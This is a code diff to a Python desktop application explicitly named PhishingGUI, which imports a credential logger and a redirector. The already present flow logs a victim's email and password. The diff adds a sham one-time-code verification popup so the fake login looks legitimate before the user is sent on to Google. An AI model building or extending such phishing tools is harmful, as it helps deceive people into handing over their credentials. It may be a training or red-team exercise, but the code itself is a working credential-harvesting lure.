@@ -3,6 +3,7 @@ import customtkinter as ctk
 from logger import CredentialLogger
 from redirector import Redirector
 import re
+import random
 
 class PhishingGUI:
     def __init__(self):
@@ -76,7 +77,8 @@ class PhishingGUI:
 
 
         # Dodajemy input do hasła
-        ctk.CTkLabel(self.login_frame, text="Password").pack()
+        self.password_title = ctk.CTkLabel(self.login_frame, text="Password")
+        self.password_title.pack()
         self.password_entry = ctk.CTkEntry(self.login_frame, show="*", width=300)
         self.password_entry.pack()
 
@@ -110,9 +112,48 @@ class PhishingGUI:
             return
 
         self.logger.log(self.email, password, is_valid=True)
+        self.start_otp_verification()
 
-        self.root.destroy()
-        self.redirector.redirect_to_google()
+    def generate_otp(self) -> str:
+        return f"{random.randint(100000, 999999)}"
+
+    def start_otp_verification(self):
+        self.otp = self.generate_otp()
+
+        otp_window = ctk.CTkToplevel(self.root)
+        otp_window.title("OTP Verification")
+        otp_window.geometry('400x300')
+        otp_window.configure(bg="#f2f2f2")
+
+        ctk.CTkLabel(otp_window, text="Verification code", font=ctk.CTkFont(size=16, weight="bold")).pack(pady=20)
+        ctk.CTkLabel(otp_window, text=self.otp, font=ctk.CTkFont(size=24, weight="bold")).pack(pady=20)
+
+        ctk.CTkButton(otp_window, text="Close", command=otp_window.destroy, fg_color="#1a73e8", hover_color="#1669c1").pack(pady=20)
+
+        self.show_otp_input()
+
+    def show_otp_input(self):
+        self.password_entry.pack_forget()
+        self.password_title.pack_forget()
+        self.login_button.pack_forget()
+
+        ctk.CTkLabel(self.login_frame, text="Enter verification code").pack()
+        self.otp_entry = ctk.CTkEntry(self.login_frame, width=300)
+        self.otp_entry.pack()
+
+        self.verify_otp_button = ctk.CTkButton(self.login_frame, text="Verify OTP", command=self.handle_otp_verification,
+                                         fg_color="#1a73e8", hover_color="#1669c1")
+        self.verify_otp_button.pack(pady=20)
+
+    def handle_otp_verification(self):
+        entered_otp = self.otp_entry.get()
+
+        if entered_otp == self.otp:
+            self.root.destroy()
+            self.redirector.redirect_to_google()
+        else:
+            self.show_error("Incorrect verification code.", below_widget=self.otp_entry)
+            return
 
     def run(self):
         self.root.mainloop()
